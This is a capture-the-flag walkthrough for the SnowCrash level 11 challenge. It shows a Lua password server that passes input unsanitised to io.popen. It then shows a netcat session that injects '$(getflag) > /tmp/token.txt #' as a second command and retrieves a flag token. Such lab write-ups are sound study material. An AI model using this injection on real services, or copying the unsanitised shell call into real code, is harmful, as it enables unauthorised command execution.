In the home directory you have the file `level11.lua` which contains the following:

``` lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Understanding a little bit the code, we can see that its just a server which asks for a password and then checks it by processing it with `sha1sum`, supposing that it's running as a daemon, we can exploit the `io.popen` which launches a system command by calling get flag and saving it to a file:

``` shell
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag) > /tmp/token.txt #
Erf nope..
level11@SnowCrash:~$ cat /tmp/token.txt
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
